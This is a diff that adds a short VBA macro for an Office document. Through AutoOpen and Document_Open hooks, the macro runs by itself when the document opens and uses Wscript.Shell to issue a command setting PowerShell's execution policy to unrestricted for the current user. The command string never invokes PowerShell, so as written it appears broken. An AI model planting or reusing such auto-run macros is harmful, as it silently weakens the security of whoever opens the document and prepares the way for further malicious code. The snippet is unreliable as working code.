@@ -1,0 +1,16 @@
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "Set-ExecutionPolicy -ExecutionPolicy unrestricted "
+    Str = Str + "-Scope CurrentUser -Force"
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
